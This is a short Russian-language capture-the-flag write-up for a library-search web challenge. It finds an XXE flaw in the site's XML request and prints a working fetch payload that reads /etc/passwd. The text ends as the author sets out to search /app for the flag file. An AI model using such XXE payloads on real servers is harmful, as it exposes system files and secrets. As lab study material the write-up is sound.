## [WEB] Библиотека Капиба-Сити

### Описание:
Старый библиотекарь Капибара спрятал секретный свиток в системе, но забыл куда. Говорят, он оставил подсказку в самом сервере… где-то в забытом файле.

### Анализ цели

Исходя из условий наша цель является какой то файл, вероятно .txt с флагом

Сайт выглядит как простой поисковик в библиотеке по ID. В таких сайтах часто популярные уязвимости такие как IDOR, SQLi, XSS, XXE и т.д.

Посмотрим на запрос для обработки сервером в Networks и видим XML-запрос
```xml
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>1</id>
</book>
```

XML-запрос отправляется серверу, он обрабатывает этот XML и возвращает ID книги. Можно предположить уязвимость XXE

### Эксплуатация уязвимости

Для проверки уязвимости попробуем отправить XML-запрос через консоль в DevTools
```xml
fetch('/api/endpoint', {
    method: 'POST',
    headers: {'Content-Type': 'application/xml'},
    body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY us SYSTEM "file:///etc/passwd">]>
<book><id>&us;</id></book>`
}).then(r => r.text()).then(console.log);
```

Нам вернуло список пользователей Linux. XXE подтверждена

Попробуем найти файл в системе. Замечаем что есть папка "app" - это сам вэб-ресурс с исходным кодом. Пробуем там поискать что то по типу flag.txt
